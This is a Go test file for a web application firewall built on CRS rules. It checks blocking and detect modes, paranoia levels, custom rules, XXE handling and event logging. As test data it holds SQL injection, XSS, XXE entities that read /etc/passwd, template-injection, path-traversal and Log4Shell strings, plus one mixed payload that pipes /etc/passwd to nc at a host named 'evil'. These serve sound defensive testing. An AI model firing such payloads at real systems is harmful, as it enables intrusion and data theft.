package waf

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/singhmarch86/rampart/internal/config"
	"github.com/singhmarch86/rampart/internal/events"
)

func newTestWAF(t *testing.T, cfg config.WAFConfig) *WAF {
	t.Helper()
	logger, err := events.NewLogger("")
	if err != nil {
		t.Fatalf("events.NewLogger: %v", err)
	}
	w, err := New(cfg, logger)
	if err != nil {
		t.Fatalf("waf.New: %v", err)
	}
	return w
}

func okHandler() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
}

func doRequest(t *testing.T, h http.Handler, method, target string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, target, nil)
	req.RemoteAddr = "203.0.113.1:12345"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

func TestAllowsCleanRequest(t *testing.T) {
	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q=apple")
	if rec.Code != http.StatusOK {
		t.Fatalf("expected clean request to pass, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestBlocksSQLInjection(t *testing.T) {
	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	target := "/rest/products/search?q=" + url.QueryEscape(`' OR '1'='1`)
	rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, target)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected SQLi payload to be blocked with 403, got %d", rec.Code)
	}
}

func TestBlocksXSS(t *testing.T) {
	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	target := "/rest/products/search?q=" + url.QueryEscape("<script>alert(1)</script>")
	rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, target)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected XSS payload to be blocked with 403, got %d", rec.Code)
	}
}

func TestDetectModeDoesNotBlock(t *testing.T) {
	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "detect"})
	target := "/rest/products/search?q=" + url.QueryEscape(`' OR '1'='1`)
	rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, target)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected detect mode to let the attack payload through, got %d", rec.Code)
	}
}

// CRS's template-injection rule for {% %} / <% %> syntax (934180) only
// exists at paranoia level 2 and above; the default level 1 never runs it
// (docs/FINDINGS.md #9 and #15). This is the behavior paranoia_level
// exposes, so test both sides of it, including that a normal request still
// passes at the higher level.
func TestParanoiaLevelEnablesHigherLevelRules(t *testing.T) {
	payload := "/rest/products/search?q=" + url.QueryEscape("{% print 7*7 %}")

	pl1 := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block", ParanoiaLevel: 1})
	if rec := doRequest(t, pl1.Middleware(okHandler()), http.MethodGet, payload); rec.Code != http.StatusOK {
		t.Fatalf("level 1 should not run the level-2 template rule, got %d", rec.Code)
	}

	pl2 := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block", ParanoiaLevel: 2})
	h := pl2.Middleware(okHandler())
	if rec := doRequest(t, h, http.MethodGet, payload); rec.Code != http.StatusForbidden {
		t.Fatalf("level 2 should block the template payload, got %d", rec.Code)
	}
	clean := "/rest/products/search?q=" + url.QueryEscape("apple juice")
	if rec := doRequest(t, h, http.MethodGet, clean); rec.Code != http.StatusOK {
		t.Fatalf("level 2 should still allow a normal search, got %d", rec.Code)
	}
}

// Zero means "unset" and must behave exactly like the default (level 1),
// so configs and callers that never set it are unaffected.
func TestParanoiaLevelUnsetMatchesDefault(t *testing.T) {
	payload := "/rest/products/search?q=" + url.QueryEscape("{% print 7*7 %}")
	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	if rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, payload); rec.Code != http.StatusOK {
		t.Fatalf("unset paranoia level should behave as level 1, got %d", rec.Code)
	}
}

func TestCustomRuleBlocks(t *testing.T) {
	dir := t.TempDir()
	rule := `SecRule REQUEST_URI "@beginsWith /internal-admin/" "id:1000001,phase:1,deny,status:404,log,msg:'blocked internal path'"` + "\n"
	if err := os.WriteFile(filepath.Join(dir, "01-test.conf"), []byte(rule), 0o644); err != nil {
		t.Fatal(err)
	}

	w := newTestWAF(t, config.WAFConfig{Enabled: true, Mode: "block", CustomRulesDir: dir})

	rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/internal-admin/secrets")
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected custom rule to block with 404, got %d", rec.Code)
	}

	rec = doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/public/ok")
	if rec.Code != http.StatusOK {
		t.Fatalf("expected unrelated path to pass, got %d", rec.Code)
	}
}

// The tests below load the real shipped rules directory, not a copy, so a
// typo in a shipped regex can't pass unnoticed. Each checks both sides: what
// must be blocked, and what must be left alone (the false-positive guard).
func newShippedRulesWAF(t *testing.T) http.Handler {
	t.Helper()
	w := newTestWAF(t, config.WAFConfig{
		Enabled: true, Mode: "block", ParanoiaLevel: 1,
		CustomRulesDir: filepath.Join("..", "..", "configs", "waf-custom-rules"),
	})
	return w.Middleware(okHandler())
}

func doBodyRequest(t *testing.T, h http.Handler, contentType, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/rest/products/search", strings.NewReader(body))
	req.Header.Set("Content-Type", contentType)
	req.RemoteAddr = "203.0.113.1:12345"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// Finding #15: CRS has no request rule for external entity declarations at
// any paranoia level, and a SecLang rule can't be written for it because
// the XML processor leaves REQUEST_BODY empty; the middleware checks the
// raw bytes itself (xxeDeclaration in waf.go).
func TestShippedRulesBlockXXEAndAllowOrdinaryXML(t *testing.T) {
	h := newShippedRulesWAF(t)
	blocked := map[string]string{
		"external SYSTEM entity": `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/passwd">]><x>&a;</x>`,
		"external PUBLIC entity": `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a PUBLIC "-//x//y" "http://127.0.0.1:1/z">]><x>&a;</x>`,
		"parameter entity":       `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "http://127.0.0.1:1/x.dtd"> %p;]><x/>`,
		"lowercase keywords":     `<!doctype x [<!entity a system "file:///etc/hosts">]><x>&a;</x>`,
	}
	for name, body := range blocked {
		if rec := doBodyRequest(t, h, "application/xml", body); rec.Code != http.StatusForbidden {
			t.Errorf("%s: expected 403, got %d", name, rec.Code)
		}
	}
	allowed := map[string]string{
		"plain XML":                `<?xml version="1.0"?><x>hello</x>`,
		"XHTML doctype, no entity": `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><body>hi</body></html>`,
	}
	for name, body := range allowed {
		if rec := doBodyRequest(t, h, "application/xml", body); rec.Code != http.StatusOK {
			t.Errorf("%s: expected 200, got %d", name, rec.Code)
		}
	}
}

// Finding #15: the {% %} and <% %> template syntaxes were only covered by a
// paranoia-level-2 CRS rule; 03-ssti-double-brace.conf now covers them at
// level 1, with the same narrow "needs an operator or a dangerous primitive"
// design as the {{ }} rule.
func TestShippedRulesBlockAllTemplateSyntaxesAndAllowBenignText(t *testing.T) {
	h := newShippedRulesWAF(t)
	search := func(q string) string { return "/rest/products/search?q=" + url.QueryEscape(q) }
	for _, q := range []string{
		"{{7*7}}",
		"{% print 7*7 %}",
		"{% import os %}",
		"{%- print 7*7 -%}",
		"<%= 7*7 %>",
		`<% Runtime.getRuntime().exec("x") %>`,
	} {
		if rec := doRequest(t, h, http.MethodGet, search(q)); rec.Code != http.StatusForbidden {
			t.Errorf("%q: expected 403, got %d", q, rec.Code)
		}
	}
	for _, q := range []string{
		"{{user.name}}",
		"use {% tags %} in Jinja",
		"<%- name %>",
		"100% sure, 50% off",
		"apple juice",
	} {
		if rec := doRequest(t, h, http.MethodGet, search(q)); rec.Code != http.StatusOK {
			t.Errorf("%q: expected 200 (benign), got %d", q, rec.Code)
		}
	}
}

func TestXXEDetectModeLogsButDoesNotBlock(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "detect", ParanoiaLevel: 1})
	body := `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/passwd">]><x>hello</x>`
	if rec := doBodyRequest(t, w.Middleware(okHandler()), "application/xml", body); rec.Code != http.StatusOK {
		t.Fatalf("detect mode should let an XXE body through, got %d", rec.Code)
	}
	got := drain()
	if len(got) != 1 || got[0].Action != events.ActionDetect || !strings.Contains(got[0].Reason, "XXE") {
		t.Fatalf("expected one detect event for XXE, got %+v", got)
	}
}

// newCapturingWAF is newTestWAF plus a way to read back what was logged.
func newCapturingWAF(t *testing.T, cfg config.WAFConfig) (*WAF, func() []events.Event) {
	t.Helper()
	logger, err := events.NewLogger("")
	if err != nil {
		t.Fatalf("events.NewLogger: %v", err)
	}
	ch, cancel := logger.Subscribe()
	t.Cleanup(cancel)
	w, err := New(cfg, logger)
	if err != nil {
		t.Fatalf("waf.New: %v", err)
	}
	return w, func() []events.Event {
		var got []events.Event
		for {
			select {
			case e := <-ch:
				got = append(got, e)
			default:
				return got
			}
		}
	}
}

// Finding #16: in detect mode Coraza never interrupts, so nothing used to be
// logged and an operator tuning with detect mode saw an empty dashboard.
func TestDetectModeRecordsWouldBlockEvent(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "detect"})
	h := w.Middleware(okHandler())
	target := "/rest/products/search?q=" + url.QueryEscape(`' OR '1'='1`)
	if rec := doRequest(t, h, http.MethodGet, target); rec.Code != http.StatusOK {
		t.Fatalf("detect mode should let the request through, got %d", rec.Code)
	}
	got := drain()
	if len(got) != 1 {
		t.Fatalf("expected exactly one event, got %+v", got)
	}
	e := got[0]
	if e.Action != events.ActionDetect || e.Layer != "waf" || e.ClientIP != "203.0.113.1" ||
		!strings.HasPrefix(e.Reason, "Inbound Anomaly Score Exceeded") {
		t.Fatalf("unexpected detect event: %+v", e)
	}
}

func TestDetectModeCleanRequestRecordsNothing(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "detect"})
	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q=apple")
	if got := drain(); len(got) != 0 {
		t.Fatalf("clean request should log nothing, got %+v", got)
	}
}

// Block mode must be unchanged: one block event, never a detect event.
func TestBlockModeRecordsBlockNotDetect(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	target := "/rest/products/search?q=" + url.QueryEscape(`' OR '1'='1`)
	if rec := doRequest(t, w.Middleware(okHandler()), http.MethodGet, target); rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d", rec.Code)
	}
	got := drain()
	if len(got) != 1 || got[0].Action != events.ActionBlock {
		t.Fatalf("expected one block event, got %+v", got)
	}
}

func ruleIDs(rs []events.Rule) []int {
	var ids []int
	for _, r := range rs {
		ids = append(ids, r.ID)
	}
	return ids
}

// Events must say why, not just "score exceeded": the contributing CRS rules,
// their attack class and the variable that matched, but never the value.
func TestBlockEventNamesTheRulesThatFired(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	h := w.Middleware(okHandler())
	cases := []struct {
		name, query, wantTag string
		wantRule             int
	}{
		{"sqli", `' OR '1'='1`, "attack-sqli", 942100},
		{"xss", `<script>alert(1)</script>`, "attack-xss", 941100},
		{"path traversal", `../../../etc/passwd`, "attack-lfi", 930120},
	}
	for _, c := range cases {
		target := "/rest/products/search?q=" + url.QueryEscape(c.query)
		if rec := doRequest(t, h, http.MethodGet, target); rec.Code != http.StatusForbidden {
			t.Fatalf("%s: expected 403, got %d", c.name, rec.Code)
		}
		got := drain()
		if len(got) != 1 {
			t.Fatalf("%s: expected one event, got %+v", c.name, got)
		}
		e := got[0]
		if e.Score < 5 {
			t.Errorf("%s: score %d, want >= the blocking threshold", c.name, e.Score)
		}
		found := false
		for _, r := range e.Rules {
			if r.ID == c.wantRule {
				found = true
				if r.Msg == "" || r.Severity < 0 || r.PL != 1 {
					t.Errorf("%s: rule %d lacks detail: %+v", c.name, r.ID, r)
				}
				hasTag := false
				for _, tag := range r.Tags {
					hasTag = hasTag || tag == c.wantTag
				}
				if !hasTag {
					t.Errorf("%s: rule %d tags %v, want %s", c.name, r.ID, r.Tags, c.wantTag)
				}
			}
			if r.ID == 949110 || r.ID == 959100 {
				t.Errorf("%s: evaluation rule %d must not be listed", c.name, r.ID)
			}
			if strings.Contains(r.Var, c.query) || strings.Contains(r.Msg, c.query) {
				t.Errorf("%s: rule leaks the request value: %+v", c.name, r)
			}
		}
		if !found {
			t.Errorf("%s: rule %d not among %v", c.name, c.wantRule, ruleIDs(e.Rules))
		}
		if len(e.Rules) > maxEventRules {
			t.Errorf("%s: %d rules exceeds cap %d", c.name, len(e.Rules), maxEventRules)
		}
	}
}

func TestDetectEventNamesTheRulesToo(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "detect"})
	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q="+url.QueryEscape(`' OR '1'='1`))
	got := drain()
	if len(got) != 1 || got[0].Action != events.ActionDetect || len(got[0].Rules) == 0 || got[0].Score < 5 {
		t.Fatalf("detect event should carry score and rules: %+v", got)
	}
	if got[0].Rules[0].Var != "ARGS:q" {
		t.Errorf("matched variable = %q, want ARGS:q", got[0].Rules[0].Var)
	}
}

// A custom rule appears with its own ID, so an operator can tell their rule
// from CRS's.
func TestCustomRuleAppearsWithItsID(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{
		Enabled: true, Mode: "block", ParanoiaLevel: 1, CustomRulesDir: "../../configs/waf-custom-rules",
	})
	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q="+url.QueryEscape("{{7*7}}"))
	got := drain()
	if len(got) != 1 {
		t.Fatalf("expected one event, got %+v", got)
	}
	var custom bool
	for _, r := range got[0].Rules {
		custom = custom || (r.ID >= customRuleIDMin && r.Msg != "")
	}
	if !custom {
		t.Fatalf("expected a custom-range rule among %+v", got[0].Rules)
	}
}

// A payload mixing many attack types trips far more rules than an event
// should carry: the list is capped and the remainder counted.
func TestEventRulesAreCappedAndRemainderCounted(t *testing.T) {
	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
	payload := `1' UNION SELECT username,password FROM users WHERE 1=1; DROP TABLE x-- <script>alert(1)</script> ../../etc/passwd ; cat /etc/passwd | nc evil 1 ${jndi:ldap://x/a}`
	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/search?q="+url.QueryEscape(payload))
	got := drain()
	if len(got) != 1 {
		t.Fatalf("expected one event, got %d", len(got))
	}
	if len(got[0].Rules) != maxEventRules || got[0].RulesOmitted == 0 {
		t.Fatalf("expected %d rules and some omitted, got %d rules, %d omitted",
			maxEventRules, len(got[0].Rules), got[0].RulesOmitted)
	}
}
